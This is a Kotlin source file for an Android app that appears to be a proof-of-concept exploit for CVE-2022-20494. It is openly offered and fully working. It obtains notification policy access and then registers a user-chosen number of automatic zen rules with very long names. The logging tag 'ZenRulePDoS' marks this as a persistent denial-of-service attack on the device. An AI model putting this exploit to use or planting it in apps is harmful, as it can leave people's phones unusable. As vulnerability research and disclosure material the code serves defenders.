package me.sithi.cve_2022_20494

import android.app.AutomaticZenRule
import android.app.NotificationManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import me.sithi.cve_2022_20494.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        val n: NotificationManager? = getSystemService(NotificationManager::class.java); n!!
        if(!n.isNotificationPolicyAccessGranted)
            startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS))
        binding.button.setOnClickListener {
            val size = Integer.parseInt(binding.size.editText!!.text.toString())
            val count = Integer.parseInt(binding.count.editText!!.text.toString())
            val name = String(CharArray(size)).replace('\u0000', 'A')
            for (i in 1..count) {
                val u = Uri.parse("content://test")
                val a = AutomaticZenRule(name, ComponentName("me.sithi.cve_2022_20494", ""), u, 0, true)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    a.configurationActivity = ComponentName("me.sithi.cve_2022_20494", "me.sithi.cve_2022_20494.MainActivity")
                val res = n.addAutomaticZenRule(a)
                Log.e("ZenRulePDoS", "$i : $res")
            }
        }
    }
}